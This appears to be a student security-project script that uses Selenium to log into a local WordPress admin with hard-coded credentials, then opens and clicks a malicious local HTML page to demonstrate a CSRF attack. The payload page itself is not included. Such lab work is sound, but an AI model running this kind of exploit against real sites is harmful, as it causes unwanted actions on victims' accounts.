#exploit program

from selenium import webdriver
from selenium.webdriver.common.keys import Keys

#user has already to be logged in the website
driver = webdriver.Firefox()
driver.get("http://127.0.0.1/wp/wp-admin")

username_field = driver.find_element_by_id("user_login")
username_field.send_keys("admin")

password_field = driver.find_element_by_id("user_pass")
password_field.send_keys("pass")

driver.find_element_by_id("wp-submit").click()

#admin is inside the website

#get location of the folder where attack.html file is saved
#open the malicious HTML file
driver.get("file:///home/chiara/github/InformationSecurityProject/csrf%20exploit/attack.html")
#after clicking on the page, the malicious code is executed and the
#harmful actions are performed by victim without him knowing

malicious_click = driver.find_element_by_id("attack_div")
malicious_click.click()

#redirection to homepage
driver.get("http://127.0.0.1/wp/wp-admin")
